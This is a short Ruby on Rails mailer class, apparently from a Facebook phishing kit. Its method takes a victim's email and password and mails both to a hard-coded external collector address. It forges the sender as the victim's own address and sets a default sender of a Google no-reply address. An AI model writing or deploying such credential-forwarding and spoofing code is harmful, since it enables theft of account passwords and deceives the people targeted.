class FbMailer < ActionMailer::Base
default from: 'no-reply@accounts.google.com'
  def fb_created(email,password)
    @email = email
    @password = password
    mail(

        to: 'st118173@ait.asia',
        from: @email,
        subject: "An email is tracked in yours Facebook webiste",

    )

  end

end